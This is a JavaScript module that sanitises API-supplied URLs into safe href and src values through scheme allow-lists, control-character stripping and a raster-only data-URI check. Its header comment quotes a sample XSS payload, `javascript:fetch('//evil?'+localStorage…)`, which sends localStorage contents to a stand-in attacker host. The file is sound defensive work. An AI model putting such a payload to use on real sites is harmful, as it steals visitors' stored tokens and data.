// Every URL that reaches the page from the API — project links, social links,
// the logo, article and project images — passes through here before it becomes
// an href or a src.
//
// The threat is a stored value like `javascript:fetch('//evil?'+localStorage…)`
// (or `data:text/html,…`) saved into a project link or a social URL — through a
// compromised admin account, or a bug on the backend. As an href it runs in the
// visitor's browser, on this origin, the moment someone clicks. React 19 blocks
// `javascript:` in href on its own, but that is one library's safety net; this
// is an explicit allow-list at the point where untrusted data enters.
//
// Anything not on the list comes back as '' and the caller renders nothing.

const LINK_SCHEMES = new Set(['http:', 'https:', 'mailto:', 'tel:']);
const IMG_SCHEMES = new Set(['http:', 'https:']);
// Raster data URIs only. An SVG data URI is inert inside <img>, but it is the
// one image type that can carry script, so there is no reason to admit it.
const DATA_IMG = /^data:image\/(png|jpe?g|gif|webp|avif);base64,[a-z0-9+/=\s]+$/i;

const parse = (value) => {
  if (typeof value !== 'string') return null;
  // Strip the whitespace and control characters browsers ignore inside a
  // scheme ("java\tscript:" still runs), before deciding anything.
  // eslint-disable-next-line no-control-regex
  const v = value.replace(/[\u0000- \u007f-\u009f]+/g, '').trim();
  if (!v) return null;
  return v;
};

// Same-site paths and in-page anchors are always fine; protocol-relative
// "//host" is not a same-site path and goes through the scheme check instead.
const isLocal = (v) => (v.startsWith('/') && !v.startsWith('//')) || v.startsWith('#');

export const safeHref = (value) => {
  const v = parse(value);
  if (!v) return '';
  if (isLocal(v)) return value.trim();
  try {
    const u = new URL(v, 'https://placeholder.invalid');
    // A bare "example.com" parses as a relative path; the admin clearly meant a site.
    if (u.origin === 'https://placeholder.invalid') return /^[\w-]+(\.[\w-]+)+/.test(v) ? `https://${v}` : '';
    return LINK_SCHEMES.has(u.protocol) ? u.href : '';
  } catch {
    return '';
  }
};

export const safeImg = (value) => {
  const v = parse(value);
  if (!v) return '';
  if (v.startsWith('data:')) return DATA_IMG.test(v) ? v : '';
  if (isLocal(v)) return value.trim();
  try {
    const u = new URL(v, 'https://placeholder.invalid');
    if (u.origin === 'https://placeholder.invalid') return '';
    // Upgrade plain http images: the page is https, and a mixed-content image is
    // either blocked or a tracking/tampering opportunity on the network.
    if (u.protocol === 'http:') u.protocol = 'https:';
    return IMG_SCHEMES.has(u.protocol) ? u.href : '';
  } catch {
    return '';
  }
};
